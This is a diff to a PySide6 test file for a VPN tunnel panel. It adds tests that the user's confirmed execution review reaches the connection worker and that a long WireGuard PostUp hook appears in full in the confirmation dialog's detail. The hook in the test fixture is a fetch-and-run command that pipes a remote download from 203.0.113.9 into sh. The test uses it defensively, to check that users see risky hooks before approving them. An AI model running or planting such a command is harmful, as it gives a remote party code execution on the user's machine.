@@ -1351,10 +1351,11 @@ class FakeVpnConnectionWorker(QObject):
     error_signal = Signal(str)
     instances = []
 
-    def __init__(self, action, profile):
+    def __init__(self, action, profile, confirmed=None):
         super().__init__()
         self.action = action
         self.profile = profile
+        self.confirmed = confirmed
         self.started = False
         FakeVpnConnectionWorker.instances.append(self)
 
@@ -3440,6 +3441,41 @@ class TestTunnelPanel:
         assert len(FakeVpnConnectionWorker.instances) == 1
         assert FakeVpnConnectionWorker.instances[0].action == "connect"
         assert FakeVpnConnectionWorker.instances[0].profile["interface"] == "wg0"
+
+    def test_the_worker_gets_the_review_the_user_confirmed(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services.vpn_execution import ExecutionReview
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        confirmed = FakeVpnConnectionWorker.instances[0].confirmed
+        assert isinstance(confirmed, ExecutionReview)
+        assert confirmed.action == "connect" and confirmed.target == "wg0"
+
+    def test_a_long_hook_is_shown_whole_in_the_dialog_detail(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        command = "curl -s http://203.0.113.9/" + "a" * 500 + " | sh"
+        conf = tmp_path / "wgh.conf"
+        conf.write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            f"PostUp = {command}\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+        boxes = []
+        monkeypatch.setattr(QMessageBox, "exec", lambda box: (
+            boxes.append((box.text(), box.detailedText())) or QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Hooked", {
+            "name": "Hooked", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+            "interface": "wgh", "config_path": str(conf)})
+        tunnel.connect_vpn()
+        assert len(boxes) == 1 and FakeVpnConnectionWorker.instances == []
+        text, detail = boxes[0]
+        assert command not in text and "more characters" in text
+        assert command in detail
 
     def test_the_confirmation_shows_the_review_and_defaults_to_no(self, tunnel, monkeypatch):
         from PySide6.QtWidgets import QMessageBox
